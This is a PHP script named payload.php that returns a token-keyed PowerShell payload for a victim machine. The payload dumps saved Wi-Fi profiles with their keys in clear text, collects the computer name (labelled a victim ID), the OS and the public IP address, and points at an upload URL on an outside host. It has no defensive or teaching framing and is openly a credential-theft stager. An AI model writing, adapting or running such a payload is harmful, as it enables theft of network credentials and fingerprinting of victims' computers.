<?php
/* payload.php – returns PowerShell payload for a given token */
$token = $_GET['token'] ?? '';
if (empty($token)) {
    http_response_code(403);
    exit('Access Denied: Missing token.');
}
$ps = <<< 'PS'
$u='https://narain.udhees.com/upload.php?token=%TOKEN%';
$t=$env:TEMP;
netsh wlan export profile folder="$t" key=clear > $null;
$os=(Get-CimInstance Win32_OperatingSystem).Caption;
$victimId=$env:COMPUTERNAME;
try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org').Content}catch{$pub='(unknown)'};
# Additional payload code can be added here
PS;
$ps = str_replace('%TOKEN%', $token, $ps);
header('Content-Type: text/plain; charset=utf-8');
echo $ps;
?>
